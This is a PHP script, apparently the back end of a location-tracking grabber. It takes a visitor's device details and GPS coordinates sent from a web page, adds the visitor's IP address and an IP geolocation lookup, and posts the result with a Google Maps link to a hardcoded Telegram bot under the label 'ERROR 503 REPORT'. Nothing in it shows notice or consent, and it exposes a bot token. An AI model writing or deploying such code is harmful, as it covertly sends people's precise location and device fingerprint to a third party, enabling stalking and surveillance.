<?php
// ============== KONFIGURASI ==============
$BOT_TOKEN = "8265128385:AAGq0vfCzwg1RJDQDUn9Pt_M_qx4LjC89o8";
$CHAT_ID   = "8287603753";

// ============== TERIMA DATA JS ==============
$input = json_decode(file_get_contents("php://input"), true);

// ============== DATA SERVER ==============
function getClientIP() {
    $keys = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];

    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim($ipList[0]);
        }
    }
    return 'Unknown';
}

$ip = getClientIP();
$time = date("Y-m-d H:i:s");

// ============== IP INFO ==============
$ipinfo = @json_decode(file_get_contents("https://ipapi.co/{$ip}/json/"), true);

// ============== FORMAT PESAN (KEREN) ==============
$message = "
🚨 *ERROR 503 REPORT*

━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : {$input['os']}
💻 Platform     : {$input['platform']}
⚙️ CPU Cores    : {$input['cpu']}
💾 RAM          : {$input['ram']}
🖥 Resolution   : {$input['resolution']}
🌐 Browser      :
{$input['browser']}
🕒 Timezone     : {$input['timezone']}
🗣 Language     : {$input['language']}
🌍 Public IP    : {$ip}

━━━━━━━━━━━━━━━━━━━━
🌎 *IP INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🧭 Continent    : {$ipinfo['continent_code']}
🇮🇩 Country      : {$ipinfo['country_name']}
📍 Region       : {$ipinfo['region']}
🏙 City         : {$ipinfo['city']}
🏢 ISP / Org    : {$ipinfo['org']}

━━━━━━━━━━━━━━━━━━━━
📡 *LOCATION INFORMATION*
━━━━━━━━━━━━━━━━━━━━
📐 Latitude     : {$input['latitude']}
📏 Longitude    : {$input['longitude']}
🎯 Accuracy     : {$input['accuracy']}

🗺 Google Maps:
https://www.google.com/maps?q={$input['latitude']},{$input['longitude']}

⏰ Time : {$time}
";

// ============== KIRIM TELEGRAM ==============
$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";

$data = [
  "chat_id" => $CHAT_ID,
  "text"    => $message,
  "parse_mode" => "Markdown"
];

$options = [
  "http" => [
    "header"  => "Content-Type: application/json",
    "method"  => "POST",
    "content" => json_encode($data)
  ]
];

file_get_contents($url, false, stream_context_create($options));